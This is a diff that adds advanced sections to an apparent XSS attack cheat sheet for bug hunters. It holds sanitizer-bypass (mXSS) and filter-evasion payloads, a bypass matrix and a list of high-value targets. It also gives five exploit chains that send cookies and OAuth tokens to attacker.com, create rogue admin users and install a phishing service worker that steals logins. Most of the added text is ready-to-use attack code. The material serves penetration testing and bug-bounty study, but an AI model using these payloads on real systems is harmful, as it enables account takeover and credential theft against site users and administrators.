@@ -501,3 +501,289 @@ $('div').append(userInput)
 - For stored XSS, check if the payload executes in admin panels viewing user-submitted content
 - Use browser DevTools console errors to identify blocked payloads and tune bypasses
 - Test CSP header with `https://csp-evaluator.withgoogle.com/` to identify bypasses before crafting payloads
+
+---
+
+## Advanced Techniques
+
+### Mutation XSS (mXSS)
+
+Browser HTML parsing mutates certain inputs after sanitization, re-introducing XSS
+after the sanitizer already passed the content. Exploits differences between the
+serializer and the parser.
+
+```html
+<!-- noscript mutation: sanitizer sees harmless text, browser re-parses as XSS -->
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+
+<!-- table context mutation -->
+<table><td id="</td><img src=x onerror=alert(1)>
+
+<!-- namespace confusion mutation (HTML → SVG → HTML) -->
+<svg><p><style><img src=1 onerror=alert(1)></style></p></svg>
+```
+
+**Root cause:** DOMPurify, sanitize-html, and similar libraries serialize their output
+using innerHTML. When the browser re-parses that output in a different context (e.g.,
+after JS sets innerHTML again), the HTML is parsed differently — introducing elements
+the sanitizer never saw.
+
+**Reference:** mXSS attacks by Mario Heiderich; DOMPurify bypass research.
+
+### CSS-Based Injection (Content Visibility State Change)
+
+```html
+<!-- Triggers on browsers supporting content-visibility CSS property -->
+<!-- Works on hidden inputs — no user interaction required in some browsers -->
+<input type="hidden"
+  oncontentvisibilityautostatechange="alert(1)"
+  style="content-visibility:auto">
+
+<!-- Works in Chromium 105+ when content-visibility triggers a state change -->
+<div style="content-visibility:auto"
+  oncontentvisibilityautostatechange="alert(document.cookie)">content</div>
+```
+
+### Remote Payload Fetch via SVG/fetch
+
+```javascript
+// Load and eval external JS to keep payload URL-safe and short
+<svg/onload='fetch("//attacker.com/xss.js").then(r=>r.text().then(t=>eval(t)))'>
+
+// Useful when: payload length is limited, WAF blocks inline JS keywords
+// External file xss.js contains the actual exploitation code
+```
+
+### URI Scheme Whitespace Bypass (javascript: filter evasion)
+
+```javascript
+// Insert whitespace characters between "java" and "script"
+// These are stripped by HTML parser before href is evaluated
+java%0ascript:alert(1)    // newline (LF)
+java%09script:alert(1)    // tab
+java%0dscript:alert(1)    // carriage return (CR)
+javascript://%0Aalert(1)  // comment + newline trick
+
+// Use in href, src, action attributes
+<a href="java%0ascript:alert(1)">click</a>
+```
+
+### Markdown Injection → XSS
+
+```markdown
+[click me](javascript:alert(document.cookie))
+[click me](javascript:prompt(document.cookie))
+
+// data: URI with base64-encoded XSS page
+[click me](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
+```
+
+**Where to test:** Any field that renders user input as Markdown (GitHub, GitLab,
+Jira, Confluence, chat applications, README preview, comment sections).
+
+### Uppercase Encoding Bypass
+
+```html
+<!-- Hex entities with uppercase X bypass case-sensitive entity filters -->
+<IMG SRC=1 ONERROR=&#X61;&#X6C;&#X65;&#X72;&#X74;(1)>
+
+<!-- Decimal entities mixed with raw chars -->
+<img src=x onerror=&#97lert(1)>   <!-- some parsers strip & and # leaving alert -->
+```
+
+### postMessage XSS — Sender Confusion
+
+```javascript
+// App checks e.data.sender but doesn't verify e.origin
+window.addEventListener('message', function(e) {
+    if (e.data.sender === 'accounts') {
+        location.href = e.data.url;   // open redirect / XSS via javascript:
+    }
+});
+
+// Exploit from any origin:
+window.poc = window.open('https://victim.com');
+setTimeout(() => {
+    window.poc.postMessage(
+        {"sender": "accounts", "url": "javascript:alert(document.cookie)"},
+        '*'
+    );
+}, 2000);
+```
+
+### Nested SVG and Foreign Object
+
+```html
+<!-- foreignObject creates an HTML namespace inside SVG — bypasses some parsers -->
+<svg>
+  <foreignObject width="100%" height="100%">
+    <div xmlns="http://www.w3.org/1999/xhtml">
+      <script>alert(1)</script>
+    </div>
+  </foreignObject>
+</svg>
+
+<!-- Nested SVG inside HTML — different parsing contexts -->
+<svg><svg onload=alert(1)>
+```
+
+---
+
+## Threat Model
+
+> Current patterns as of 2026-Q2. Update each session.
+
+**What's being exploited in the wild:**
+
+1. **DOM XSS in SPAs via postMessage** — Single-page apps (React, Vue, Angular) use
+   postMessage for cross-frame communication. Weak or missing origin checks are
+   extremely common. Particularly dangerous in OAuth flows where tokens are passed
+   via postMessage from popup windows.
+
+2. **Mutation XSS (mXSS) against sanitizers** — DOMPurify bypasses are discovered
+   regularly (tracked in their changelog). Apps that sanitize server-side then re-insert
+   via innerHTML are vulnerable. Electron apps with `nodeIntegration` + mXSS = RCE.
+
+3. **oncontentvisibilityautostatechange** — New CSS event handler that bypasses many
+   WAF rules and sanitizers because it's a recent browser feature not yet in block lists.
+   Works on hidden inputs without user interaction.
+
+4. **CSP via JSONP still unpatched at scale** — Many large platforms whitelist CDNs or
+   partner domains that serve JSONP. Report volume on HackerOne for this pattern remains
+   high. Always run `csp-evaluator.withgoogle.com` before concluding CSP blocks you.
+
+5. **Stored XSS in admin notification paths** — Bug hunters are finding stored XSS in
+   low-visibility fields (API key names, webhook descriptions) that only render in admin
+   panels. Impact is critical (admin ATO) despite the obscure injection point.
+
+---
+
+## Bypass Matrix
+
+| Filter / Defense | Bypass Technique | Payload Example |
+|-----------------|------------------|-----------------|
+| `<script>` blocked | Event handler injection | `<img src=x onerror=alert(1)>` |
+| All tags blocked | Attribute injection (break out of attr) | `" onmouseover="alert(1)` |
+| HTML tags + attrs blocked | JS context injection | `';alert(1)//` |
+| `javascript:` blocked | URI whitespace bypass | `java%0ascript:alert(1)` |
+| `alert` keyword blocked | `confirm`, `prompt`, `console.log` | `<img src=x onerror=confirm(1)>` |
+| `()` blocked | Template literal / backtick | `alert\`1\`` |
+| `alert` + `()` + backtick blocked | `eval` with encoded string | `eval('\x61\x6c\x65\x72\x74\x281\x29')` |
+| Length limit | Remote payload fetch | `<svg/onload='fetch("//x.co/a").then(r=>r.text().then(eval))'>` |
+| Sanitizer (DOMPurify) | mXSS via noscript/namespace mutation | `<noscript><p title="</noscript><img src=x onerror=alert(1)>">` |
+| CSP `script-src self` | JSONP on whitelisted domain | `<script src="//whitelisted.com/jsonp?cb=alert(1)">` |
+| CSP `strict-dynamic` | Script gadget in loaded library | Angular `ng-app` + `{{constructor.constructor('alert(1)')()}}` |
+| WAF keyword filter | Uppercase entities | `&#X61;&#X6C;&#X65;&#X72;&#X74;(1)` |
+| WAF tag filter | SVG foreignObject | `<svg><foreignObject><div xmlns="..."><script>alert(1)</script></div></foreignObject></svg>` |
+
+---
+
+## High-Value Targets
+
+| Target | Why High Value | Impact |
+|--------|---------------|--------|
+| Admin panel viewing user-submitted content | XSS fires in admin context | Admin ATO, full platform access |
+| OAuth popup that postMessages token | Steal token via wildcard postMessage | Account takeover |
+| File upload with SVG/HTML allowed | Stored XSS with no interaction barrier | All viewers affected |
+| Support chat (messages visible to agents) | Agent cookie/session theft | Support agent ATO |
+| API key / webhook name fields | Often rendered in admin dashboard | Admin XSS |
+| PDF/report generator with user content | XSS in headless browser = SSRF | Can chain to SSRF → IMDS |
+| Electron apps | `nodeIntegration` may be enabled | XSS → RCE (OS command execution) |
+| Browser extensions | `chrome.tabs`, `externally_connectable` misuse | Extension privilege escalation |
+| React with `dangerouslySetInnerHTML` | Bypasses React's DOM sanitization | Stored/reflected XSS |
+| Legacy AngularJS (1.x) in SPAs | Template injection in `ng-bind-html` | Full XSS via `{{}}` expressions |
+
+---
+
+## Real-World Chains
+
+### Chain 1: Stored XSS in API Key Name → Admin ATO
+
+```
+1. Target: SaaS platform where API key names are displayed in admin billing view
+2. Create an API key with name: <img src=x onerror="fetch('/api/admin/users').then(...)">
+3. Admin opens billing page → XSS fires in admin context
+4. XSS payload:
+   a. Fetch admin's CSRF token from settings page
+   b. POST to /api/admin/users → create new admin user with attacker email
+   c. Or: exfil admin's session cookie to attacker server
+5. Attacker logs in as admin
+
+Impact: Critical — full platform admin access
+Real pattern: HackerOne reports on SaaS platforms (Shopify, GitLab, others)
+```
+
+### Chain 2: DOM XSS via postMessage → OAuth Token Theft
+
+```
+1. Find SPA that uses postMessage to receive OAuth tokens from popup:
+   window.addEventListener('message', function(e) {
+     if (e.data.type === 'oauth_token') { storeToken(e.data.token); }
+   }); // No origin check
+2. Host exploit page on attacker.com:
+   var victim = window.open('https://target.com/app');
+   setTimeout(() => {
+     // First: DOM XSS to open popup and intercept the real token
+     // Or: Directly steal via message listener race
+     window.addEventListener('message', function(e) {
+       fetch('https://attacker.com/steal?t=' + JSON.stringify(e.data));
+     });
+   }, 3000);
+3. Victim visits attacker.com → their OAuth token is exfilled
+4. Attacker uses token to access victim's account via API
+
+Impact: Critical — account takeover without victim interaction
+```
+
+### Chain 3: mXSS Bypass → Stored XSS in Markdown
+
+```
+1. App uses DOMPurify to sanitize Markdown-rendered HTML before inserting via innerHTML
+2. Inject mXSS payload in a comment field:
+   <noscript><p title="</noscript><img src=x onerror=fetch('https://attacker.com?c='+document.cookie)>">
+3. DOMPurify serializes and sees: <noscript>...</noscript> — passes as safe
+4. Browser parses the serialized output again via innerHTML → noscript tag ends early
+   → img tag is introduced → onerror fires
+5. All users who view the comment are affected
+
+Impact: High — stored XSS affecting all comment viewers
+```
+
+### Chain 4: XSS → Service Worker Injection → Persistent XSS
+
+```javascript
+// 1. Find XSS on target.com
+// 2. Register a malicious service worker that intercepts all future requests:
+<script>
+navigator.serviceWorker.register('data:application/javascript,'+encodeURIComponent(`
+  self.addEventListener('fetch', e => {
+    if (e.request.url.includes('/login')) {
+      e.respondWith(new Response(
+        '<form action="https://attacker.com/steal" method=POST>'+
+        '<input name=user><input name=pass type=password><button>Login</button></form>',
+        {headers: {'Content-Type': 'text/html'}}
+      ));
+    }
+  });
+`));
+</script>
+// 3. Service worker persists after XSS page is closed
+// 4. All future visits to /login serve attacker's phishing form
+// 5. Credentials POSTed to attacker.com
+
+Impact: Critical — persistent phishing even after XSS session ends
+Note: data: scheme for SW registration is Chrome-only; requires HTTPS origin
+```
+
+### Chain 5: Reflected XSS + Self-XSS Escalation via CSRF
+
+```
+1. Find self-XSS in a setting that requires user interaction (paste something here)
+2. Find CSRF vulnerability on the same endpoint
+3. Combine: craft CSRF request that submits the XSS payload on behalf of victim
+4. Victim visits attacker page → CSRF fires → XSS payload stored in victim's profile
+5. XSS executes when victim views their own profile
+
+Impact: Medium-High — converts self-XSS + CSRF into stored XSS
+Technique used in: multiple HackerOne reports where self-XSS alone was N/A'd
+```
